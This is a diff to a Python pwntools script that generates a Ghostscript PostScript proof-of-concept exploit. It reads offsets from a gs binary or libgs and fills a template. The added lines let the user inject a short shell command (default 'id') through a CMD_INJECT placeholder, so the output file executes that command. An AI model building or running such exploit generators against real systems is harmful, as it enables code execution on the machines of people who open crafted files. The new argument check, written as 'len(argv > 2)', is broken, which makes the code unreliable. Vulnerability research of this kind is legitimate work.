@@ -8,12 +8,21 @@
 from pwn import *
 from sys import argv
 
-if len(argv) != 2:
-    print("Usage: python {argv[0]} /path/to/gs_bin or libgs")
+if len(argv) < 2:
+    print("Usage: python {argv[0]} </path/to/gs_bin or libgs> [rce command(<=7Byte) default:id]")
     exit(1)
 
 
 elf_path = argv[1]
+
+if len(argv > 2):
+    rce = argv[2].encode()
+    if len(rce) > 7 or len(rce) == 0:
+        print("Invalid rce command: improper length; 0 < len(rce.encode()) < 8")
+        exit(2)
+    rce = rce.ljust(8, b'\0').hex()
+else:
+    rce = 'id'.encode().ljust(8, b'\0').hex()
 
 # Load the ELF file
 elf = ELF(elf_path)
@@ -38,6 +47,7 @@ with open("final-poc.ps.template", "r") as f:
 
 final_file = final_file.replace("F_ADDR_S_STD_NOSEEK_OFFSET", str(f_addr_s_std_noseek_offset))
 final_file = final_file.replace("LIBC_PLT_OFFSET", str(libc_plt_offset))
+final_file = final_file.replace("CMD_INJECT", rce)
 
 with open("final-poc.ps", "w") as f:
     f.write(final_file)
